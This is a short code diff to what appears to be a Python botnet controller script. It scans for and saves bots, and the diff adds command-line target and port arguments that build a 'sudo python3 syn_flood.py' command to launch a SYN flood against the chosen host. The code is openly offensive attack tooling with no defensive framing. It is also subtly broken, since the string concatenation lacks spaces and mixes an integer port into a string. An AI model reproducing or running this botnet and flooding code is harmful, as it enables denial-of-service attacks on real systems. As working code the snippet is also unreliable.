@@ -9,12 +9,19 @@ from rwList import RW
 from command import Command
 import argparse
 
+parser = argparse.ArgumentParser()
 
 listip = Scanbot.scan()
 
 Scanbot.display_result(listip)
-
-order = input("Command:")
 RW.saveBot(listip)
-botNet = Command.addClient()
-Command.botnetCommand(order,botNet)  
+
+parser.add_argument('-t','--target', help='Destination address', required=True)
+parser.add_argument('-p', '--port', help='Destination Port number', type=int, required=True)
+args = parser.parse_args()
+
+command = 'cd && sudo python3 syn_flood.py -t' + args.target + '-p'+ args.port
+
+
+
+
